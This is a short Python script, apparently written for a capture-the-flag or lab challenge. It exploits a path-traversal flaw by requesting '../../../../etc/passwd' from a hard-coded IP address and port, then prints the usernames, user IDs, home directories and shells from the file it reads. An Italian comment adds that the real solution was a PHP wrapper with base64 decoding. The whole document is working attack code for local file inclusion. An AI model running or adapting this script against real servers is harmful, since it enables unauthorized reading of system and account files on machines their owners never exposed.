import requests

url = "http://100.84.44.31:9019/?file=../../../../../../../../etc/passwd"
response = requests.get(url=url)

#TUTTO INUTILE!!! La soluzione era usare php wrapper e poi decodificare il php da base64.


l = 0 
for line in response.text.split('\n'):
    line = line.split(':')
    if len(line) > 6:
        print('\n\n', l)
        print("username =",  line[0])
        print("password =",  line[1])
        print("user ID =",  line[2])
        print("User group ID =",line[3])
        print("Full name =", line[4])
        print("user home dir =", line[5])
        print("login shell =",  line[6])
    l += 1
